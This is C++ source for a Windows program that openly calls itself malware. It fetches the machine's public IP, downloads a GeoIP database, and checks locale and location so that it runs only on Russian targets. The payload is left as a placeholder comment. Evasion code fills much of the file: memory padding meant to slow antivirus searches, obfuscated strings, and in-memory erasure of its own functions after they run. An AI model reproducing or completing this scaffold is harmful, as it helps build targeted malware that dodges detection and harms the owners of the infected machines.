#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Windows.h>
#include <algorithm>
#include <utility>
#include <consoleapi.h>
#include <iostream>

#include <winsock2.h>
#include <wininet.h>
#include <ws2tcpIP.h>
#include <IPhlpapi.h>
#include <stdio.h>
#include <GeoLite2PP.hpp>

#include "thunderbolt_lite.hpp"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define MEGABYTE (1024 * 1024)

std::string getPublicIPStub() {
	return "";
}
std::string getPublicIP() {

	HINTERNET net = InternetOpen(_ ("IP retriever"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET connection = InternetOpenUrl(net, _ ("http://myexternalIP.com/raw"), NULL, 0, INTERNET_FLAG_RELOAD, 0);

	char buffer[4096];
	DWORD dataRead;

	InternetReadFile(connection, buffer, sizeof(buffer) / sizeof(buffer[0]), &dataRead);
	InternetCloseHandle(net);

	return std::string(buffer, dataRead);
}
std::string getGeoIPDatabaseStub() {
	return "";
}
char geoIPBuffer[MEGABYTE * 8];
std::string getGeoIPDatabase() {

	HINTERNET net = InternetOpen(_("GeoIP retriever"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET connection = InternetOpenUrl(net, _("https://github.com/2hf/GeoLite2-ASN-Database/blob/main/GeoLite2-ASN.mmdb?raw=true"), NULL, 0, INTERNET_FLAG_RELOAD, 0);

	DWORD dataRead;

	InternetReadFile(connection, geoIPBuffer, sizeof(geoIPBuffer) / sizeof(geoIPBuffer[0]), &dataRead);
	InternetCloseHandle(net);

	return std::string(geoIPBuffer, dataRead);
}
std::string getCountryStub() {
	return "";
}
std::string getCountry() {
	GEOID myGEO = GetUserGeoID(GEOCLASS_NATION);
	int sizeOfBuffer = GetGeoInfo(myGEO, GEO_ISO2, NULL, 0, 0);
	CHAR* buffer = new CHAR[sizeOfBuffer];
	int result = GetGeoInfo(myGEO, GEO_ISO2, buffer, sizeOfBuffer, 0);
	return buffer;
}
void startStub() {
}
void start() {
	// Allocate useless memory in program to increase search times for antivirus solutions
	char* allocBuffer = (char*)malloc(MEGABYTE * 24);

	std::string IP = getPublicIP();
	std::string country = getCountry();
	std::string DBName = "GeoIP.mmdb";

	std::ofstream outDB(DBName);
	outDB << getGeoIPDatabase();
	outDB.close();

	GeoLite2PP::DB DB(DBName);

	std::string json = DB.lookup(IP);

#ifdef _DEBUG
	std::cout << "IP: " << IP << " country: " << country;
	std::cout << json << std::endl;
#else
	// Double checks to make sure the target is Russian
	bool IPIsRussian = json.find(_("Russia")) != std::string::npos;
	bool countryIsRussian = country.find(_("RU")) != std::string::npos;
	if (countryIsRussian || IPIsRussian) {
		// This is where the <<malware>> code will run
	}
#endif
}
int main() {
	// Get function sizes and memory addresses
	thunderbolt::c_function startFunction(start, startStub);
	thunderbolt::c_function getIPFunction(getPublicIP, getPublicIPStub);
	thunderbolt::c_function getCountryFunction(getCountry, getCountryStub);
	thunderbolt::c_function getGeoIPFunction(getGeoIPDatabase, getGeoIPDatabaseStub);

	thunderbolt::c_entropy entropy;

	// Add to entropy clear list
	entropy.add_element(startFunction);
	entropy.add_element(getIPFunction);
	entropy.add_element(getCountryFunction);
	entropy.add_element(getGeoIPFunction);

	start();

	entropy.erase_functions();

	Sleep(5000);
	return 0;
}